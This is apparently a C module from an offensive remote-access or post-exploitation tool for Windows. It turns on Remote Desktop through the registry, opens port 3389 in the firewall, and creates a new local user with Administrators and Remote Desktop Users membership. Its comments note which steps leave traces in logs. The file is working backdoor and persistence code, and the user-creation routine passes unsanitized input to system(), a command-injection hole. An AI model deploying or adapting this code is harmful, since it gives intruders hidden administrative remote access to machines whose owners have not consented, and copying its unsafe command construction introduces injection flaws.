#include "rdp.h"
#include <stdio.h>
#include <string.h>

/* Registry key controlling RDP access */
#define RDP_REG_PATH "SYSTEM\\CurrentControlSet\\Control\\Terminal Server"
#define RDP_REG_VALUE "fDenyTSConnections"

/**
 * Active RDP sur la machine
 */
int rdp_enable(char *output, size_t size) {
    HKEY hKey;
    DWORD value = 0; // 0 = RDP activé
    LONG result;
    int ret_code = RDP_SUCCESS;

    output[0] = '\0';

    // 1. Modifier le registre
    result = RegOpenKeyExA(
        HKEY_LOCAL_MACHINE,
        RDP_REG_PATH,
        0,
        KEY_SET_VALUE,
        &hKey
    );

    if (result != ERROR_SUCCESS) {
        snprintf(output, size, "[-] Registry access denied (need admin)\n");
        return RDP_ERROR_ACCESS_DENIED;
    }

    result = RegSetValueExA(
        hKey,
        RDP_REG_VALUE,
        0,
        REG_DWORD,
        (const BYTE*)&value,
        sizeof(DWORD)
    );

    RegCloseKey(hKey);

    if (result != ERROR_SUCCESS) {
        snprintf(output, size, "[-] Failed to modify registry\n");
        return RDP_ERROR_REGISTRY;
    }

    snprintf(output, size, "[+] Registry: RDP enabled\n");

    // 2. Ajouter règle firewall via netsh
    // ATTENTION: Cette commande sera visible dans les logs
    char fw_cmd[512];
    snprintf(fw_cmd, sizeof(fw_cmd),
        "netsh advfirewall firewall add rule name=\"Remote Desktop\" "
        "dir=in protocol=TCP localport=3389 action=allow >nul 2>&1"
    );

    int fw_result = system(fw_cmd);

    if (fw_result == 0) {
        strncat(output, "[+] Firewall: Rule added\n", size - strlen(output) - 1);
    } else {
        strncat(output, "[-] Firewall: Failed (may already exist)\n", size - strlen(output) - 1);
        ret_code = RDP_ERROR_FIREWALL;
    }

    strncat(output, "[*] RDP is now enabled on port 3389\n", size - strlen(output) - 1);

    return ret_code;
}

/**
 * Désactive RDP
 */
int rdp_disable(char *output, size_t size) {
    HKEY hKey;
    DWORD value = 1; // 1 = RDP désactivé
    LONG result;

    output[0] = '\0';

    // 1. Modifier le registre
    result = RegOpenKeyExA(
        HKEY_LOCAL_MACHINE,
        RDP_REG_PATH,
        0,
        KEY_SET_VALUE,
        &hKey
    );

    if (result != ERROR_SUCCESS) {
        snprintf(output, size, "[-] Registry access denied (need admin)\n");
        return RDP_ERROR_ACCESS_DENIED;
    }

    result = RegSetValueExA(
        hKey,
        RDP_REG_VALUE,
        0,
        REG_DWORD,
        (const BYTE*)&value,
        sizeof(DWORD)
    );

    RegCloseKey(hKey);

    if (result != ERROR_SUCCESS) {
        snprintf(output, size, "[-] Failed to modify registry\n");
        return RDP_ERROR_REGISTRY;
    }

    snprintf(output, size, "[+] Registry: RDP disabled\n");

    // 2. Supprimer règle firewall
    char fw_cmd[512];
    snprintf(fw_cmd, sizeof(fw_cmd),
        "netsh advfirewall firewall delete rule name=\"Remote Desktop\" >nul 2>&1"
    );

    int fw_result = system(fw_cmd);

    if (fw_result == 0) {
        strncat(output, "[+] Firewall: Rule removed\n", size - strlen(output) - 1);
    } else {
        strncat(output, "[-] Firewall: Failed (may not exist)\n", size - strlen(output) - 1);
    }

    strncat(output, "[*] RDP is now disabled\n", size - strlen(output) - 1);

    return RDP_SUCCESS;
}

/**
 * Vérifie le statut RDP
 */
int rdp_status(char *output, size_t size) {
    HKEY hKey;
    DWORD value;
    DWORD value_size = sizeof(DWORD);
    LONG result;

    output[0] = '\0';

    result = RegOpenKeyExA(
        HKEY_LOCAL_MACHINE,
        RDP_REG_PATH,
        0,
        KEY_QUERY_VALUE,
        &hKey
    );

    if (result != ERROR_SUCCESS) {
        snprintf(output, size, "[-] Cannot read registry (need admin)\n");
        return RDP_ERROR_ACCESS_DENIED;
    }

    result = RegQueryValueExA(
        hKey,
        RDP_REG_VALUE,
        NULL,
        NULL,
        (LPBYTE)&value,
        &value_size
    );

    RegCloseKey(hKey);

    if (result != ERROR_SUCCESS) {
        snprintf(output, size, "[-] Cannot read RDP status\n");
        return RDP_ERROR_REGISTRY;
    }

    if (value == 0) {
        snprintf(output, size, "[*] RDP Status: ENABLED (port 3389)\n");
    } else {
        snprintf(output, size, "[*] RDP Status: DISABLED\n");
    }

    return RDP_SUCCESS;
}

/**
 * Crée un utilisateur avec accès RDP
 */
int rdp_adduser(const char *username, const char *password, char *output, size_t size) {
    char cmd[1024];
    int result;

    output[0] = '\0';

    if (!username || !password || strlen(username) == 0 || strlen(password) == 0) {
        snprintf(output, size, "[-] Invalid username or password\n");
        return RDP_ERROR_USER;
    }

    // 1. Créer l'utilisateur
    snprintf(cmd, sizeof(cmd),
        "net user \"%s\" \"%s\" /add >nul 2>&1",
        username, password
    );

    result = system(cmd);

    if (result != 0) {
        snprintf(output, size, "[-] Failed to create user (need admin or user exists)\n");
        return RDP_ERROR_ACCESS_DENIED;
    }

    snprintf(output, size, "[+] User created: %s\n", username);

    // 2. Ajouter au groupe Administrators
    snprintf(cmd, sizeof(cmd),
        "net localgroup Administrators \"%s\" /add >nul 2>&1",
        username
    );

    result = system(cmd);

    if (result == 0) {
        strncat(output, "[+] Added to Administrators group\n", size - strlen(output) - 1);
    } else {
        strncat(output, "[-] Failed to add to Administrators\n", size - strlen(output) - 1);
    }

    // 3. Ajouter au groupe Remote Desktop Users
    snprintf(cmd, sizeof(cmd),
        "net localgroup \"Remote Desktop Users\" \"%s\" /add >nul 2>&1",
        username
    );

    result = system(cmd);

    if (result == 0) {
        strncat(output, "[+] Added to Remote Desktop Users\n", size - strlen(output) - 1);
    } else {
        strncat(output, "[-] Failed to add to RDP group\n", size - strlen(output) - 1);
    }

    strncat(output, "[*] User ready for RDP access\n", size - strlen(output) - 1);
    strncat(output, "[!] WARNING: User creation logged in Event Viewer\n", size - strlen(output) - 1);

    return RDP_SUCCESS;
}
